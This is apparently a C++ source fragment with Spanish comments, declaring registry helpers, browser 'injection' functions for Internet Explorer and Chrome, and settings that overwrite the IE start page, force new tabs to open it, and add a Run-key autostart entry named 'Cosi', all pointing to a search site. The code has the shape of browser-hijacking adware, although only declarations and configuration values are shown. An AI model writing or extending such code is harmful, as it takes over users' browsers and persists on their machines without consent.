#include <string.h>
using namespace std;

/*########################################################
############### DECLARACION DE FUNCIONES #################
########################################################*/
string ObtenerValorRegistro(string Ruta, string Consulta);
bool GuardarRegistro(string Ruta, string Consulta, string Valor);
bool ExisteRegistro(string Ruta);
void EliminarRegistro(string Ruta, string Consulta);

//Comprobar versiones
void ComprobarGX();

//Inyeccion de navegadores
void InyectarIE();
void InyectarCH();

//DEBUG
int prueba();


/*########################################################
############### DECLARACION DE VARIABLES #################
########################################################*/
//Otras
string ruta_sin_comillas;
char ruta_actual[1024];


//Obtener Ruta de algunos navegadores
string ruta_applocal_reg = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
string consulta_applocal = "Local AppData";
string ruta_chrome ;




//***** IE ******
//Pag Inicio
string ruta_ie = "Software\\Microsoft\\Internet Explorer\\Main";
string consulta_ie = "Start Page";
//Inyectar Tabs
string ruta_reg_tabs_ie = "Software\\Microsoft\\Internet Explorer\\TabbedBrowsing";
string consulta_tabs_ie = "NewTabPageShow";
DWORD valor_tabs_ie= 1; //valor para que se abra nueva pestaña en homepage
//Autoinicio
string ruta_reg_autoinicio = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
string nombre_autoinicio = "Cosi"; 


//Configuración del GX

string ruta_reg_gx = "SOFTWARE\\GX";
string version_reg_str = "VERSION";
string ruta_reg_str = "RUTA";
string pag_inicio_reg_str = "PAG_INICIO";
string nombre_autoinicio_str = "AUTOINICIO";
string version_gx = "17";
string pag_inicio_gx = "http://www.gaxpa-search.com/";
